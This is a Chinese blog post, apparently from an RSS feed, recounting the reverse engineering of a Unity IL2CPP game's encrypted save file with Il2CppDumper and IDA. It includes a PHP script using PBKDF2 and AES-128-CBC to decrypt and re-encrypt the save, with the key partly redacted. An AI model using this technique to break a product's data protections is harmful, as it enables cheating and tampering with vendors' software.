-
-
-<p>要分析 IL2CPP 后的文件原本并不容易，即使没有经过混淆，但由于字符串、函数名等基本上都被拿到了单独的文件，很难找到需要找的代码段。好在 <a rel="noreferrer noopener" aria-label="Perfare (opens in a new tab)" href="https://www.perfare.net/" target="_blank">Perfare</a> 大神写了个 <a rel="noreferrer noopener" aria-label="Il2CppDumper (opens in a new tab)" href="https://github.com/Perfare/Il2CppDumper" target="_blank">Il2CppDumper</a>，可以分析这两个文件，并将字符串、函数名通过 IDA 显示在二进制文件的对应位置。</p>
-
-
-
-<pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">Input Unity version:
-2018.3
-Initializing metadata...
-Select Mode: 1.Manual 2.Auto 3.Auto(Plus) 4.Auto(Symbol)
-3
-Initializing il2cpp file...
-Applying relocations...
-Searching...
-CodeRegistration : 16e534c
-MetadataRegistration : 16e5384
-Dumping...
-Done !
-Create DummyDll...
-Done !
-Press any key to exit...</pre>
-
-
-
-<p>Il2CppDumper 处理完毕后，可获得 DummyDll、dump.cs 以及 script.py 几个文件。前两个文件包含了分析出的各种类定义，script.py 则是辅助 IDA 分析 .so 文件的。</p>
-
-
-
-<div class="wp-block-image"><figure class="aligncenter is-resized"><img loading="lazy" src="https://coxxs.me/wp-content/uploads/2019/08/image.png" alt="" class="wp-image-1284" width="162" height="83"/></figure></div>
-
-
-
-<p>打开 dump.cs，搜索字符串 prefs.json，很快找到了该字符串所在的类，同时发现了一个疑似密钥的字符串 EK（版权原因，密钥已隐去）。</p>
-
-
-
-<figure class="wp-block-image"><img loading="lazy" width="1024" height="507" src="https://coxxs.me/wp-content/uploads/2019/08/image-1-1024x507.png" alt="" class="wp-image-1285" srcset="https://dev.moe/wp-content/uploads/2019/08/image-1-1024x507.png 1024w, https://dev.moe/wp-content/uploads/2019/08/image-1-300x149.png 300w, https://dev.moe/wp-content/uploads/2019/08/image-1-768x380.png 768w, https://dev.moe/wp-content/uploads/2019/08/image-1.png 1472w" sizes="(max-width: 1024px) 100vw, 1024px" /></figure>
-
-
-
-<p>EK 长度为 20 字节；而如果看作 Base64，解码后则是 15 字节。无论哪种情况，都不符合 AES、DES、3DES 的密钥长度。将它作为 RC4 的密钥解密存档文件 prefs.json 呢？果然——不行。</p>
-
-
-
-<h2>分析 il2cpp.so </h2>
-
-
-
-<p>乖乖分析代码逻辑吧。用 IDA 打开  libil2cpp.so，Alt+F7 运行刚才生成的 script.py，稍等片刻，定位到对应函数 F5 反编译，就获得了一份有可读性的代码。</p>
-
-
-
-<figure class="wp-block-image"><img loading="lazy" width="1024" height="491" src="https://coxxs.me/wp-content/uploads/2019/08/image-3-1024x491.png" alt="" class="wp-image-1287" srcset="https://dev.moe/wp-content/uploads/2019/08/image-3-1024x491.png 1024w, https://dev.moe/wp-content/uploads/2019/08/image-3-300x144.png 300w, https://dev.moe/wp-content/uploads/2019/08/image-3-768x369.png 768w, https://dev.moe/wp-content/uploads/2019/08/image-3.png 1738w" sizes="(max-width: 1024px) 100vw, 1024px" /></figure>
-
-
-
-<p>这里从 UserPrefs 类的 Init 函数入手，发现在该函数内，构造了一个用于加解密的类。密钥为 &#8220;Local-&#8221; + Guid + EK。其中的 &#8220;Local-&#8221; + Guid 部分，恰好就是游戏存档文件所在的文件夹名。</p>
-
-
-
-<p>完整的密钥找到了，不过还是不确定加密算法，于是继续分析 CryptoUtility::ctor() 构造函数。</p>
-
-
-
-<figure class="wp-block-image"><img loading="lazy" width="1024" height="570" src="https://coxxs.me/wp-content/uploads/2019/08/image-5-1024x570.png" alt="" class="wp-image-1290" srcset="https://dev.moe/wp-content/uploads/2019/08/image-5-1024x570.png 1024w, https://dev.moe/wp-content/uploads/2019/08/image-5-300x167.png 300w, https://dev.moe/wp-content/uploads/2019/08/image-5-768x427.png 768w, https://dev.moe/wp-content/uploads/2019/08/image-5.png 1625w" sizes="(max-width: 1024px) 100vw, 1024px" /></figure>
-
-
-
-<p>这里的 AesManaged 和 Rfc2898DeriveBytes 两个类都是 .NET 提供的，这样一来就很清楚了：</p>
-
-
-
-<ol><li>构造 Rfc2898DeriveBytes 类，将刚才传入的 <code>存档文件夹名 + EK</code> 的密钥作为 password，将另一个字串 &#8220;0xa&#8230;..s&#8221; 作为 salt</li><li>AesManaged 默认使用 AES-128-CBC，因此用  Rfc2898DeriveBytes 类生成出一组 IV (16 Bytes) 及 Key  (16 Bytes)。</li><li>对存档进行加解密。</li></ol>
-
-
-
-<h2>加解密程序</h2>
-
-
-
-<p>参考了前人<a rel="noreferrer noopener" aria-label="PHP 中对 .NET 的 Rfc2898DeriveBytes 类的实现 (opens in a new tab)" href="https://medium.com/rabbit-mobile-business-blog/writing-c-s-rfc2898derivebytes-in-php-88fa8c096dcb" target="_blank">在 PHP 中对 .NET 的 Rfc2898DeriveBytes 类的实现</a>，<s>用最好的语言</s>实现了加解密程序：</p>
-
-
-
-<pre class="EnlighterJSRAW" data-enlighter-language="php" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">&lt;?php
-
-class SymmetricEncryption {
-    private $cipher;
-    public function __construct($cipher = 'aes-128-cbc') {
-        $this->cipher = $cipher;
-    }
-    private function getKeySize() {
-        if (preg_match("/([0-9]+)/i", $this->cipher, $matches)) {
-            return $matches[1] >> 3;
-        }
-        return 0;
-    }
-    function derived($password, $salt) {
-        $AESKeyLength = $this->getKeySize();
-        $AESIVLength = openssl_cipher_iv_length($this->cipher);
-        $pbkdf2 = hash_pbkdf2("SHA1", $password, $salt, 1000, $AESKeyLength + $AESIVLength, TRUE);
-        $key = substr($pbkdf2, 0, $AESKeyLength);
-        $iv =  substr($pbkdf2, $AESKeyLength, $AESIVLength);
-        $derived = new stdClass();
-        $derived->key = $key;
-        $derived->iv = $iv;
-        return $derived;
-    }
-    function encrypt($message, $password, $salt) {
-        $derived = $this->derived($password, $salt);
-        $enc = openssl_encrypt($message, $this->cipher, $derived->key, OPENSSL_RAW_DATA, $derived->iv);
-        return $enc;
-    }
-    function decrypt($message, $password, $salt) {
-        $derived = $this->derived($password, $salt);
-        $dec = openssl_decrypt($message, $this->cipher, $derived->key, OPENSSL_RAW_DATA, $derived->iv);
-        return $dec;
-    }
-}
-
-$name = 'Local-db23521a-d1ea-2197-8640-f112c7f9ced9';
-$password = $name.'8C................2l'; // 版权原因，隐去一部分
-$salt = '0x.........s';
-
-// decrypt
-$file = file_get_contents('prefs.json.encrypted');
-$file = substr($file, 2); // 去除文件头
-$se = new SymmetricEncryption();
-$decrypted = $se->decrypt($file, $password, $salt);
-
-// encrypt
-$file = file_get_contents('prefs.json');
-$file = $se->encrypt($file, $password, $salt);
-$encrypted = 'EN'.$file; // 加上文件头</pre>
-
-
-
-<figure class="wp-block-image"><img loading="lazy" width="1024" height="408" src="https://coxxs.me/wp-content/uploads/2019/08/image-6-1024x408.png" alt="" class="wp-image-1291" srcset="https://dev.moe/wp-content/uploads/2019/08/image-6-1024x408.png 1024w, https://dev.moe/wp-content/uploads/2019/08/image-6-300x120.png 300w, https://dev.moe/wp-content/uploads/2019/08/image-6-768x306.png 768w, https://dev.moe/wp-content/uploads/2019/08/image-6.png 1555w" sizes="(max-width: 1024px) 100vw, 1024px" /><figcaption>解密后的存档文件</figcaption></figure>
-
-
-
-<h2>尾声与思考</h2>
-
-
-
-<p>这游戏的变态之处绝不仅是用 Rfc2898DeriveBytes 和 AES 给存档加密.. 改完存档浪了几分钟，发现金币又归零了。</p>
-
-
-
-<p>再次分析，发现这游戏把所有获得金币、经验、道具的事件都加了一个 ID，每次获得物品都会把对应的事件 ID 放到队列里，并择机上报给服务器；同理，消耗物品也会上报。<strong>猜测</strong>服务器其实也维护了一份物品数据，如果游戏发现与服务器数据差别过大就会加载服务器的数据。于是只好禁止游戏联网玩了。</p>
-
-
-
-<p>或许比起修改存档，把消耗金币的代码取消掉才是更正确的选择。不过修改 .so 与打包游戏又是另一个故事了。</p>
-
-
-
-<p><strong>Coxxs</strong></p>
-<p><a rel="nofollow" href="https://dev.moe/1282">记一次 Unity IL2CPP 游戏逆向</a>最先出现在<a rel="nofollow" href="https://dev.moe">Coxxs</a>。</p>
-]]></content:encoded>
-					
-					<wfw:commentRss>https://dev.moe/1282/feed</wfw:commentRss>
-			<slash:comments>3</slash:comments>
-		
-		
-		<post-id xmlns="com-wordpress:feed-additions:1">1282</post-id>	</item>
 	</channel>
 </rss>
